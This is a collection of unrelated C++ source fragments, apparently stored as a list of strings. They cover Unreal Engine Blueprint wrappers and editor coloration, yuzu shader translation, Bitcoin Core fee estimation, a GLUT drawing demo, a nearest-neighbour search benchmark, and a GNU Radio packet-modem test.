HasOutParams, BlueprintEvent)\n// Parameters:\n// class AActor*                      MyTarget                                                         (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// struct FGameplayCueParameters      Parameters                                                       (ConstParm, BlueprintVisible, BlueprintReadOnly, Parm, OutParm, ReferenceParm, ContainsInstancedReference)\n// TArray<class UParticleSystemComponent*>ParticleComponents                                               (ConstParm, BlueprintVisible, BlueprintReadOnly, Parm, OutParm, ReferenceParm, ContainsInstancedReference, HasGetValueTypeHash)\n// TArray<class UAudioComponent*>     AudioComponents                                                  (ConstParm, BlueprintVisible, BlueprintReadOnly, Parm, OutParm, ReferenceParm, ContainsInstancedReference, HasGetValueTypeHash)\n\nvoid AGCNL_Uncle_Dash_Charging_C::OnLoopingStart(class AActor* MyTarget, struct FGameplayCueParameters& Parameters, TArray<class UParticleSystemComponent*>& ParticleComponents, TArray<class UAudioComponent*>& AudioComponents)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"GCNL_Uncle_Dash_Charging_C\", \"OnLoopingStart\");\n\n\tParams::AGCNL_Uncle_Dash_Charging_C_OnLoopingStart_Params Parms{};\n\n\tParms.MyTarget = MyTarget;\n\tParms.Parameters = Parameters;\n\tParms.ParticleComponents = ParticleComponents;\n\tParms.AudioComponents = AudioComponents;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n}\n\n\n// Function GCNL_Uncle_Dash_Charging.GCNL_Uncle_Dash_Charging_C.ResetGate\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AGCNL_Uncle_Dash_Charging_C::ResetGate()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"GCNL_Uncle_Dash_Charging_C\", \"ResetGate\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function GCNL_Uncle_Dash_Charging.GCNL_Uncle_Dash_Charging_C.ChargeTierUp\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AGCNL_Uncle_Dash_Charging_C::ChargeTierUp()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"GCNL_Uncle_Dash_Charging_C\", \"ChargeTierUp\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function GCNL_Uncle_Dash_Charging.GCNL_Uncle_Dash_Charging_C.OnRemoval\n// (Event, Public, HasOutParams, BlueprintEvent)\n// Parameters:\n// class AActor*                      MyTarget                                                         (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// struct FGameplayCueParameters      Parameters                                                       (ConstParm, BlueprintVisible, BlueprintReadOnly, Parm, OutParm, ReferenceParm, ContainsInstancedReference)\n// TArray<class UParticleSystemComponent*>ParticleComponents                                               (ConstParm, BlueprintVisible, BlueprintReadOnly, Parm, OutParm, ReferenceParm, ContainsInstancedReference, HasGetValueTypeHash)\n// TArray<class UAudioComponent*>     AudioComponents                                                  (ConstParm, BlueprintVisible, BlueprintReadOnly, Parm, OutParm, ReferenceParm, ContainsInstancedReference, HasGetValueTypeHash)\n// class UMatineeCameraShake*         BurstCameraShakeInstance                                         (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// class ADecalActor*                 BurstDecalInstance                                               (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid AGCNL_Uncle_Dash_Charging_C::OnRemoval(class AActor* MyTarget, struct FGameplayCueParam",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n#include \"CustomActorColorationRegister.h\"\n\n#include \"CustomActorColorationSettings.h\"\n#include \"GameFramework/ActorPrimitiveColorHandler.h\"\n\n#define LOCTEXT_NAMESPACE \"CustomActorColorationRegister\"\n\nUCustomActorColorationRegister::UCustomActorColorationRegister()\n{\n#if ENABLE_ACTOR_PRIMITIVE_COLOR_HANDLER\n\tif (HasAnyFlags(RF_ClassDefaultObject) && ExactCast<UCustomActorColorationRegister>(this))\n\t{\n\t\tconst UCustomActorColorationSettings* Settings = UCustomActorColorationSettings::Get();\n\t\t\n\t\t// Cast Shadow\n\t\tif(Settings->bUseColorationCastShadow)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CastShadow\"), LOCTEXT(\"CastShadow\", \"Cast Shadow\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif (InPrimitiveComponent->CastShadow)\n\t\t\t\t{\n\t\t\t\t\treturn FLinearColor::Red;\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// Capsule Shadow\n\t\tif(Settings->bUseColorationCastCapsuleShadow)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CastCapsuleShadow\"), LOCTEXT(\"CastCapsuleShadow\", \"Cast Capsule Shadow\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif (AActor* Actor = InPrimitiveComponent->GetOwner())\n\t\t\t\t{\n\t\t\t\t\tTArray<USkeletalMeshComponent*> SkelMeshComponents;\n\t\t\t\t\tActor->GetComponents(USkeletalMeshComponent::StaticClass(), SkelMeshComponents);\n\t\t\t\t\tfor (USkeletalMeshComponent* SkelMeshComponent : SkelMeshComponents)\n\t\t\t\t\t{\n\t\t\t\t\t\tconst bool bCastDirect = SkelMeshComponent->bCastCapsuleDirectShadow;\n\t\t\t\t\t\tconst bool bCastIndirect = SkelMeshComponent->bCastCapsuleIndirectShadow;\n\t\t\t\t\t\tif(bCastDirect)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(bCastIndirect)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\treturn FLinearColor::Red; // Direct && Indirect\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\treturn FLinearColor::Green; // Direct\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if(bCastIndirect)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\treturn FLinearColor::Blue; // Indirect\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// PhysicalMaterial\n\t\tif(Settings->bUseColorationPhysicalMaterial)\n\t\t{\n\t\t\t// PhysicalMaterial Simple\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"PhysicalMaterialSimple\"), LOCTEXT(\"PhysicalMaterialSimple\", \"PhysicalMaterial Simple\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif(const FBodyInstance* BodyInstance = InPrimitiveComponent->GetBodyInstance())\n\t\t\t\t{\n\t\t\t\t\tconst UPhysicalMaterial* PhysicalMaterial = BodyInstance->GetSimplePhysicalMaterial();\n\t\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->PhysicalMaterialColorMap;\n\t\t\t\t\tif(ColorMap.Contains(PhysicalMaterial))\n\t\t\t\t\t{\n\t\t\t\t\t\treturn *ColorMap.Find(PhysicalMaterial);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\n\t\t\t// PhysicalMaterial Complex\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"PhysicalMaterialComplex\"), LOCTEXT(\"PhysicalMaterialComplex\", \"PhysicalMaterial Complex\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tif(const FBodyInstance* BodyInstance = InPrimitiveComponent->GetBodyInstance())\n\t\t\t\t{\n\t\t\t\t\tconst TArray<UPhysicalMaterial*> PhysicalMaterials = BodyInstance->GetComplexPhysicalMaterials();\n\n\t\t\t\t\tif(!PhysicalMaterials.IsEmpty())\n\t\t\t\t\t{\n\t\t\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->PhysicalMaterialColorMap;\n\n\t\t\t\t\t\tFLinearColor ResultColor = FLinearColor::Black;\n\t\t\t\t\t\tfor (const auto PhysicalMaterial : PhysicalMaterials)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(ColorMap.Contains(PhysicalMaterial))\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tResultColor += *ColorMap.Find(PhysicalMaterial);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn ResultColor / PhysicalMaterials.Num();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\n\t\t// CollisionPreset\n\t\tif(Settings->bUseColorationCollisionPreset)\n\t\t{\n\t\t\tFActorPrimitiveColorHandler::Get().RegisterPrimitiveColorHandler(TEXT(\"CollisionPreset\"), LOCTEXT(\"CollisionPreset\", \"Collision Preset\"), [](const UPrimitiveComponent* InPrimitiveComponent) -> FLinearColor\n\t\t\t{\n\t\t\t\tconst FName ProfileName = InPrimitiveComponent->GetCollisionProfileName();\n\t\t\t\tauto& ColorMap = UCustomActorColorationSettings::Get()->CollisionPresetColorMap;\n\t\t\t\tif(ColorMap.Contains(ProfileName))\n\t\t\t\t{\n\t\t\t\t\treturn *ColorMap.Find(ProfileName);\n\t\t\t\t}\n\t\t\t\n\t\t\t\treturn FLinearColor::White;\n\t\t\t});\n\t\t}\n\t}\n#endif\n}\n",
    "// SPDX-FileCopyrightText: Copyright 2021 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"common/bit_field.h\"\n#include \"common/common_types.h\"\n#include \"shader_recompiler/exception.h\"\n#include \"shader_recompiler/frontend/ir/ir_emitter.h\"\n#include \"shader_recompiler/frontend/maxwell/translate/impl/impl.h\"\n\nnamespace Shader::Maxwell {\nnamespace {\nenum class Size : u64 {\n    B32,\n    B64,\n    B96,\n    B128,\n};\n\nenum class InterpolationMode : u64 {\n    Pass,\n    Multiply,\n    Constant,\n    Sc,\n};\n\nenum class SampleMode : u64 {\n    Default,\n    Centroid,\n    Offset,\n};\n\nu32 NumElements(Size size) {\n    switch (size) {\n    case Size::B32:\n        return 1;\n    case Size::B64:\n        return 2;\n    case Size::B96:\n        return 3;\n    case Size::B128:\n        return 4;\n    }\n    throw InvalidArgument(\"Invalid size {}\", size);\n}\n\ntemplate <typename F>\nvoid HandleIndexed(TranslatorVisitor& v, IR::Reg index_reg, u32 num_elements, F&& f) {\n    const IR::U32 index_value{v.X(index_reg)};\n    for (u32 element = 0; element < num_elements; ++element) {\n        const IR::U32 final_offset{\n            element == 0 ? index_value : IR::U32{v.ir.IAdd(index_value, v.ir.Imm32(element * 4U))}};\n        f(element, final_offset);\n    }\n}\n\n} // Anonymous namespace\n\nvoid TranslatorVisitor::ALD(u64 insn) {\n    union {\n        u64 raw;\n        BitField<0, 8, IR::Reg> dest_reg;\n        BitField<8, 8, IR::Reg> index_reg;\n        BitField<20, 10, u64> absolute_offset;\n        BitField<20, 11, s64> relative_offset;\n        BitField<39, 8, IR::Reg> vertex_reg;\n        BitField<32, 1, u64> o;\n        BitField<31, 1, u64> patch;\n        BitField<47, 2, Size> size;\n    } const ald{insn};\n\n    const u64 offset{ald.absolute_offset.Value()};\n    if (offset % 4 != 0) {\n        throw NotImplementedException(\"Unaligned absolute offset {}\", offset);\n    }\n    const IR::U32 vertex{X(ald.vertex_reg)};\n    const u32 num_elements{NumElements(ald.size)};\n    if (ald.index_reg == IR::Reg::RZ) {\n        for (u32 element = 0; element < num_elements; ++element) {\n            if (ald.patch != 0) {\n                const IR::Patch patch{offset / 4 + element};\n                F(ald.dest_reg + static_cast<int>(element), ir.GetPatch(patch));\n            } else {\n                const IR::Attribute attr{offset / 4 + element};\n                F(ald.dest_reg + static_cast<int>(element), ir.GetAttribute(attr, vertex));\n            }\n        }\n        return;\n    }\n    if (ald.patch != 0) {\n        throw NotImplementedException(\"Indirect patch read\");\n    }\n    HandleIndexed(*this, ald.index_reg, num_elements, [&](u32 element, IR::U32 final_offset) {\n        F(ald.dest_reg + static_cast<int>(element), ir.GetAttributeIndexed(final_offset, vertex));\n    });\n}\n\nvoid TranslatorVisitor::AST(u64 insn) {\n    union {\n        u64 raw;\n        BitField<0, 8, IR::Reg> src_reg;\n        BitField<8, 8, IR::Reg> index_reg;\n        BitField<20, 10, u64> absolute_offset;\n        BitField<20, 11, s64> relative_offset;\n        BitField<31, 1, u64> patch;\n        BitField<39, 8, IR::Reg> vertex_reg;\n        BitField<47, 2, Size> size;\n    } const ast{insn};\n\n    if (ast.index_reg != IR::Reg::RZ) {\n        throw NotImplementedException(\"Indexed store\");\n    }\n    const u64 offset{ast.absolute_offset.Value()};\n    if (offset % 4 != 0) {\n        throw NotImplementedException(\"Unaligned absolute offset {}\", offset);\n    }\n    const IR::U32 vertex{X(ast.vertex_reg)};\n    const u32 num_elements{NumElements(ast.size)};\n    if (ast.index_reg == IR::Reg::RZ) {\n        for (u32 element = 0; element < num_elements; ++element) {\n            if (ast.patch != 0) {\n                const IR::Patch patch{offset / 4 + element};\n                ir.SetPatch(patch, F(ast.src_reg + static_cast<int>(element)));\n            } else {\n                const IR::Attribute attr{offset / 4 + element};\n                ir.SetAttribute(attr, F(ast.src_reg + static_cast<int>(element)), vertex);\n            }\n        }\n        return;\n    }\n    if (ast.patch != 0) {\n        throw NotImplementedException(\"Indexed tessellation patch store\");\n    }\n    HandleIndexed(*this, ast.index_reg, num_elements, [&](u32 element, IR::U32 final_offset) {\n        ir.SetAttributeIndexed(final_offset, F(ast.src_reg + static_cast<int>(element)), vertex);\n    });\n}\n\nvoid TranslatorVisitor::IPA(u64 insn) {\n    // IPA is the instruction used to read varyings from a fragment shader.\n    // gl_FragCoord is mapped to the gl_Position attribute.\n    // It yields unknown results when used outside of the fragment shader stage.\n    union {\n        u64 raw;\n        BitField<0, 8, IR::Reg> dest_reg;\n        BitField<8, 8, IR::Reg> index_reg;\n        BitField<20, 8, IR::Reg> multiplier;\n        BitField<30, 8, IR::Attribute> attribute;\n        BitField<38, 1, u64> idx;\n        BitField<51, 1, u64> sat;\n        BitField<52, 2, SampleMode> sample_mode;\n        BitField<54, 2, InterpolationMode> interpolation_mode;\n    } const ipa",
    "// Copyright (c) 2009-2010 Satoshi Nakamoto\n// Copyright (c) 2009-2015 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <policy/fees.h>\n#include <policy/policy.h>\n\n#include <clientversion.h>\n#include <primitives/transaction.h>\n#include <streams.h>\n#include <txmempool.h>\n#include <util.h>\n\nstatic constexpr double INF_FEERATE = 1e99;\n\nstd::string StringForFeeEstimateHorizon(FeeEstimateHorizon horizon) {\n    static const std::map<FeeEstimateHorizon, std::string> horizon_strings = {\n        {FeeEstimateHorizon::SHORT_HALFLIFE, \"short\"},\n        {FeeEstimateHorizon::MED_HALFLIFE, \"medium\"},\n        {FeeEstimateHorizon::LONG_HALFLIFE, \"long\"},\n    };\n    auto horizon_string = horizon_strings.find(horizon);\n\n    if (horizon_string == horizon_strings.end()) return \"unknown\";\n\n    return horizon_string->second;\n}\n\nstd::string StringForFeeReason(FeeReason reason) {\n    static const std::map<FeeReason, std::string> fee_reason_strings = {\n        {FeeReason::NONE, \"None\"},\n        {FeeReason::HALF_ESTIMATE, \"Half Target 60% Threshold\"},\n        {FeeReason::FULL_ESTIMATE, \"Target 85% Threshold\"},\n        {FeeReason::DOUBLE_ESTIMATE, \"Double Target 95% Threshold\"},\n        {FeeReason::CONSERVATIVE, \"Conservative Double Target longer horizon\"},\n        {FeeReason::MEMPOOL_MIN, \"Mempool Min Fee\"},\n        {FeeReason::PAYTXFEE, \"PayTxFee set\"},\n        {FeeReason::FALLBACK, \"Fallback fee\"},\n        {FeeReason::REQUIRED, \"Minimum Required Fee\"},\n        {FeeReason::MAXTXFEE, \"MaxTxFee limit\"}\n    };\n    auto reason_string = fee_reason_strings.find(reason);\n\n    if (reason_string == fee_reason_strings.end()) return \"Unknown\";\n\n    return reason_string->second;\n}\n\nbool FeeModeFromString(const std::string& mode_string, FeeEstimateMode& fee_estimate_mode) {\n    static const std::map<std::string, FeeEstimateMode> fee_modes = {\n        {\"UNSET\", FeeEstimateMode::UNSET},\n        {\"ECONOMICAL\", FeeEstimateMode::ECONOMICAL},\n        {\"CONSERVATIVE\", FeeEstimateMode::CONSERVATIVE},\n    };\n    auto mode = fee_modes.find(mode_string);\n\n    if (mode == fee_modes.end()) return false;\n\n    fee_estimate_mode = mode->second;\n    return true;\n}\n\n/**\n * We will instantiate an instance of this class to track transactions that were\n * included in a block. We will lump transactions into a bucket according to their\n * approximate feerate and then track how long it took for those txs to be included in a block\n *\n * The tracking of unconfirmed (mempool) transactions is completely independent of the\n * historical tracking of transactions that have been confirmed in a block.\n */\nclass TxConfirmStats\n{\nprivate:\n    //Define the buckets we will group transactions into\n    const std::vector<double>& buckets;              // The upper-bound of the range for the bucket (inclusive)\n    const std::map<double, unsigned int>& bucketMap; // Map of bucket upper-bound to index into all vectors by bucket\n\n    // For each bucket X:\n    // Count the total # of txs in each bucket\n    // Track the historical moving average of this total over blocks\n    std::vector<double> txCtAvg;\n\n    // Count the total # of txs confirmed within Y blocks in each bucket\n    // Track the historical moving average of theses totals over blocks\n    std::vector<std::vector<double>> confAvg; // confAvg[Y][X]\n\n    // Track moving avg of txs which have been evicted from the mempool\n    // after failing to be confirmed within Y blocks\n    std::vector<std::vector<double>> failAvg; // failAvg[Y][X]\n\n    // Sum the total feerate of all tx's in each bucket\n    // Track the historical moving average of this total over blocks\n    std::vector<double> avg;\n\n    // Combine the conf counts with tx counts to calculate the confirmation % for each Y,X\n    // Combine the total value with the tx counts to calculate the avg feerate per bucket\n\n    double decay;\n\n    // Resolution (# of blocks) with which confirmations are tracked\n    unsigned int scale;\n\n    // Mempool counts of outstanding transactions\n    // For each bucket X, track the number of transactions in the mempool\n    // that are unconfirmed for each possible confirmation value Y\n    std::vector<std::vector<int> > unconfTxs;  //unconfTxs[Y][X]\n    // transactions still unconfirmed after GetMaxConfirms for each bucket\n    std::vector<int> oldUnconfTxs;\n\n    void resizeInMemoryCounters(size_t newbuckets);\n\npublic:\n    /**\n     * Create new TxConfirmStats. This is called by BlockPolicyEstimator's\n     * constructor with default values.\n     * @param defaultBuckets contains the upper limits for the bucket boundaries\n     * @param maxPeriods max number of periods to track\n     * @param decay how much to decay the historical moving average per block\n     */\n    TxConfirmStats(const std::vector<double>& defaultBuckets, const std::map<double, unsigned int>& defaultBucketMap,\n                   unsigned int maxPeriods, double deca",
    "#include<GL/glut.h>\nvoid init(){\n\tglClearColor(0, 0, 0, 1);\n\tglMatrixMode(GL_PROJECTION);\n    glOrtho(-200,200,-200,200,-200,200);\n\n\n}\nvoid display() {\n\tglClear(GL_COLOR_BUFFER_BIT);\n\t//white quad\n\tglBegin(GL_QUADS);\n\tglColor3f(1, 1, 1);\n\tglVertex2i(-20,0);\n\tglVertex2i(-20, 15);\n\tglVertex2i(36, 15);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t//red quad\n\tglColor3f(1, 0, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20,0);\n\tglVertex2i(36,0);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t// blue triangle\n\tglColor3f(0, 0, 1);\n\tglBegin(GL_TRIANGLES);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20, 15);\n\tglVertex2i(-2, 0);\n\tglEnd();\n\t//pole \n\tglColor3f(0, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-25,-75);\n\tglVertex2i(-25,15);\n\tglVertex2i(-20,15 );\n\tglVertex2i(-20, -75);\n\tglEnd();\n\t//base height\n\tglColor3f(1, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-35,-102);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10,-75);\n\tglVertex2i(-10,-102);\n\tglEnd();\n\t// top stand \n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10, -75);\n\tglVertex2i(-15,-83);\n\tglEnd();\n\t//stand hieght\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40, -87);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-15,-83);\n\tglVertex2i(-15,-87);\n\tglEnd();\n\t//middle stand\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-40,-87);\n\tglVertex2i(-15,-87);\n\tglVertex2i(-20,-92);\n\tglEnd();\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-20,-92);\n\tglVertex2i(-20,-97);\n\tglEnd();\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-50,-102);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-20,-97);\n\tglVertex2i(-25,-102);\n\tglEnd();\n\n\tglFlush();\n\n\n}\nint main(int argc,char** argv) {\n\tglutInit(&argc, argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowPosition(0, 0);\n\tglutInitWindowSize(1000, 700);\n\tglutCreateWindow(\"day one\");\n\tinit();\n\tglutDisplayFunc(display );\n\tglutMainLoop();\n\t\n\n\t\n}",
    "#include <gtest/gtest.h>\n#include <omp.h>\n\n#include <algorithm>\n#include <boost/dynamic_bitset.hpp>\n#include <boost/program_options.hpp>\n#include <chrono>\n#include <cmath>\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n#include <filesystem>\n\n#include \"efanna2e/distance.h\"\n#include \"efanna2e/neighbor.h\"\n#include \"efanna2e/parameters.h\"\n#include \"efanna2e/util.h\"\n#include \"index_bipartite.h\"\n\nnamespace po = boost::program_options;\n\nfloat ComputeRecall(uint32_t q_num, uint32_t k, uint32_t gt_dim, uint32_t *res, uint32_t *gt) {\n    uint32_t total_count = 0;\n    for (uint32_t i = 0; i < q_num; i++) {\n        std::vector<uint32_t> one_gt(gt + i * gt_dim, gt + i * gt_dim + k);\n        std::vector<uint32_t> intersection;\n        std::vector<uint32_t> temp_res(res + i * k, res + i * k + k);\n        for (auto p : one_gt) {\n            if (std::find(temp_res.begin(), temp_res.end(), p) != temp_res.end()) intersection.push_back(p);\n        }\n\n        total_count += static_cast<uint32_t>(intersection.size());\n    }\n    return static_cast<float>(total_count) / (float)(k * q_num);\n}\n\ndouble ComputeRderr(float* gt_dist, uint32_t gt_dim, std::vector<std::vector<float>>& res_dists, uint32_t k, efanna2e::Metric metric) {\n    double total_err = 0;\n    uint32_t q_num = res_dists.size();\n\n    for (uint32_t i = 0; i < q_num; i++) {\n        std::vector<float> one_gt(gt_dist + i * gt_dim, gt_dist + i * gt_dim + k);\n        std::vector<float> temp_res(res_dists[i].begin(), res_dists[i].end());\n        if (metric == efanna2e::INNER_PRODUCT) {\n            for (size_t j = 0; j < k; ++j) {\n                temp_res[j] = -1.0 * temp_res[j];\n            }\n        } else if (metric == efanna2e::COSINE) {\n            for (size_t j = 0; j < k; ++j) {\n                temp_res[j] = 2.0 * ( 1.0 - (-1.0 * temp_res[j]));\n            }\n        }\n        double err = 0.0;\n        for (uint32_t j = 0; j < k; j++) {\n            err += std::fabs(temp_res[j] - one_gt[j]) / double(one_gt[j]);\n        }\n        err = err / static_cast<double>(k);\n        total_err = total_err + err;\n    }\n    return total_err / static_cast<double>(q_num);\n}\n\nint main(int argc, char **argv) {\n    std::string base_data_file;\n    std::string query_file;\n    std::string sampled_query_data_file;\n    std::string gt_file;\n\n    std::string bipartite_index_save_file, projection_index_save_file;\n    std::string data_type;\n    std::string dist;\n    std::vector<uint32_t> L_vec;\n    // uint32_t L_pq;\n    uint32_t num_threads;\n    uint32_t k;\n    std::string evaluation_save_path = \"\";\n\n    po::options_description desc{\"Arguments\"};\n    try {\n        desc.add_options()(\"help,h\", \"Print information on arguments\");\n        desc.add_options()(\"data_type\", po::value<std::string>(&data_type)->required(), \"data type <int8/uint8/float>\");\n        desc.add_options()(\"dist\", po::value<std::string>(&dist)->required(), \"distance function <l2/ip>\");\n        desc.add_options()(\"base_data_path\", po::value<std::string>(&base_data_file)->required(),\n                           \"Input data file in bin format\");\n        // desc.add_options()(\"sampled_query_data_path\", po::value<std::string>(&sampled_query_data_file)->required(),\n        //                    \"Sampled query file in bin format\");\n        desc.add_options()(\"query_path\", po::value<std::string>(&query_file)->required(), \"Query file in bin format\");\n        desc.add_options()(\"gt_path\", po::value<std::string>(&gt_file)->required(), \"Groundtruth file in bin format\");\n        // desc.add_options()(\"query_data_path\",\n        //                    po::value<std::string>(&query_data_file)->required(),\n        //                    \"Query file in bin format\");\n        // desc.add_options()(\"bipartite_index_save_path\", po::value<std::string>(&bipartite_index_save_file)->required(),\n        //                    \"Path prefix for saving bipartite index file components\");\n        desc.add_options()(\"projection_index_save_path\",\n                           po::value<std::string>(&projection_index_save_file)->required(),\n                           \"Path prefix for saving projetion index file components\");\n        desc.add_options()(\"L_pq\", po::value<std::vector<uint32_t>>(&L_vec)->multitoken()->required(),\n                           \"Priority queue length for searching\");\n        desc.add_options()(\"k\", po::value<uint32_t>(&k)->default_value(1)->required(), \"k nearest neighbors\");\n        desc.add_options()(\"evaluation_save_path\", po::value<std::string>(&evaluation_save_path),\n                           \"Path prefix for saving evaluation results\");\n        desc.add_options()(\"num_threads,T\", po::value<uint32_t>(&num_threads)->default_value(omp_get_num_procs()),\n                           \"Number of threads used for building index (defaults to \"\n                           \"omp_get_num_procs())\");\n\n        po::variables_map vm;\n        po::store(po::parse_command_line(argc, argv, desc), vm);\n        if (vm.count(\"help\")) {\n       ",
    "#include <fmt/core.h>\n#include <gnuradio-4.0/Block.hpp>\n#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/pdu_to_tagged_stream.hpp>\n#include <gnuradio-4.0/packet-modem/tagged_stream_to_pdu.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <gnuradio-4.0/reflection.hpp>\n#include <boost/ut.hpp>\n\ntemplate <typename T>\nclass Process : public gr::Block<Process<T>>\n{\npublic:\n    gr::PortIn<T> in;\n    gr::PortOut<T> out;\n\n    T gain = T{ 1 };\n\n    gr::work::Status processBulk(const gr::ConsumableSpan auto& inSpan,\n                                 gr::PublishableSpan auto& outSpan)\n    {\n        fmt::println(\"Process<T>::processBulk(inSpan.size(), outSpan.size() = {})\",\n                     inSpan.size(),\n                     outSpan.size());\n        const auto n = std::min(inSpan.size(), outSpan.size());\n        for (size_t j = 0; j < n; ++j) {\n            outSpan[j] = inSpan[j] * gain;\n        }\n        std::ignore = inSpan.consume(n);\n        outSpan.publish(n);\n        return gr::work::Status::OK;\n    }\n};\n\ntemplate <typename T>\nclass Process<gr::packet_modem::Pdu<T>>\n    : public gr::Block<Process<gr::packet_modem::Pdu<T>>>\n{\npublic:\n    gr::PortIn<gr::packet_modem::Pdu<T>> in;\n    gr::PortOut<gr::packet_modem::Pdu<T>> out;\n\n    T gain = T{ 1 };\n\n    gr::work::Status processBulk(const gr::ConsumableSpan auto& inSpan,\n                                 gr::PublishableSpan auto& outSpan)\n    {\n        fmt::println(\"Process<Pdu<T>>::processBulk(inSpan.size(), outSpan.size() = {})\",\n                     inSpan.size(),\n                     outSpan.size());\n        const auto n = std::min(inSpan.size(), outSpan.size());\n        for (size_t j = 0; j < n; ++j) {\n            outSpan[j].data.clear();\n            outSpan[j].data.reserve(inSpan[j].data.size());\n            for (const auto a : inSpan[j].data) {\n                outSpan[j].data.push_back(a * gain);\n            }\n            outSpan[j].tags = inSpan[j].tags;\n        }\n        std::ignore = inSpan.consume(n);\n        outSpan.publish(n);\n        return gr::work::Status::OK;\n    }\n};\n\nENABLE_REFLECTION_FOR_TEMPLATE(Process, in, out);\n\nint main()\n{\n    using namespace boost::ut;\n\n    gr::Graph fg;\n    const gr::packet_modem::Pdu<int> pdu(std::vector{ 1, 2, 3, 4, 5, 6 }, {});\n    const std::vector<gr::packet_modem::Pdu<int>> pdus = { pdu };\n    auto& source =\n        fg.emplaceBlock<gr::packet_modem::VectorSource<gr::packet_modem::Pdu<int>>>(pdus);\n    auto& to_stream = fg.emplaceBlock<gr::packet_modem::PduToTaggedStream<int>>();\n    auto& process = fg.emplaceBlock<Process<int>>();\n    auto& process_pdu = fg.emplaceBlock<Process<gr::packet_modem::Pdu<int>>>();\n    process.gain = 3;\n    process_pdu.gain = 4;\n    auto& to_pdu = fg.emplaceBlock<gr::packet_modem::TaggedStreamToPdu<int>>();\n    auto& sink =\n        fg.emplaceBlock<gr::packet_modem::VectorSink<gr::packet_modem::Pdu<int>>>();\n    auto& sink_pdu =\n        